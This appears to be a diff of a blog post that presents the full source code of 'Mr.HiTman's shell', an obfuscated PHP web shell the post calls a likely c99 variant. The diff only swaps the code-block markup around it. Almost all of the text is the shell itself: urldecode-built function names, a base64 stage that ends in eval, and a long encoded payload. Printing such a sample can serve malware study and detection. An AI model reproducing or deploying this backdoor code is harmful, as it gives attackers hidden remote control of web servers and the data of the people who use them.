@@ -16,7 +16,7 @@ Mr.HiTman&#8217;s shell is an encrypted PHP script &#8211; probably c99 or a var
 
 ### Mr.HiTman Shell Script (encrypted) Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php /* Mr.HiTman */$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63
+{% highlight php %}<?php /* Mr.HiTman */$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63
 %6f%5f%74%6e%64');$OOO0000O0=$OOO000000{4}.$OOO000000{9}.$OOO000000{3}.$OOO0000
 00{5};$OOO0000O0.=$OOO000000{2}.$OOO000000{10}.$OOO000000{13}.$OOO000000{16};$O
 OO0000O0.=$OOO0000O0{3}.$OOO000000{11}.$OOO000000{12}.$OOO0000O0{7}.$OOO000000{
@@ -30,7 +30,7 @@ wLDEwMjQpOyRPME8wMDBPMDAoJE8wMDBPME8wMCw0MDk2KTskT08wME8wME8wPSRPT08wMDAwTzAoJE
 9PTzAwMDAwTygkTzBPMDBPTzAwKCRPMDAwTzBPMDAsMzgwKSwnWGU3dldIZkk2YVJkMkMvcStVRjl6b
 E4zakJvWnhpNGNLUTBieTV3dWtQRGc4bnBPaEFyVG10c1ZFWTFNTFNKRz0nLCdBQkNERUZHSElKS0xN
 Tk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvJykpO2V2YWw
-oJE9PMDBPMDBPMCk7'));return;?&gt;
+oJE9PMDBPMDBPMCk7'));return;?>
 aWSq2veq2veq2vt5xwlu3Va5xfAQjszkatScUy52UlScarh0
 ar6paWSq9Teq2WLh27E0ar68aWSq9TXh2veq27Ky9mSq2vXh2veqR7Uq2WLh2WSq2vXkaWLh2veq2WL
 h27hy9mLh2WLh2vXhRFhuNfzVi5i6Byysjlay2y2OxFnlUb51ZWEToyaONuQPCfCdz9e049lViNn+Uf
@@ -1087,4 +1087,4 @@ Xwa0UpjNt56vmKaVCtjwtPi7xMv+PhR7xLxvELoNYhi3+KjsAQxV2S6wam60epjNt5qF6ud0UpjNt5d
 R7xLdsBOxwmJaryMv+PSv+PwiNYbif5OZ0ewZVanBwSOi7KP4hmRx7Kuq7SwZVanq0xP/hmRc+mRBul
 pjVUPZsEKxI6kafWP6I8C7wlbofLKaTAhxwzJaT8C7ueroNYm3V6kafWP/hmRBNCkZrXuq7ShxwzJaT
 8C7umC7K==
-</pre>
+{% endhighlight %}
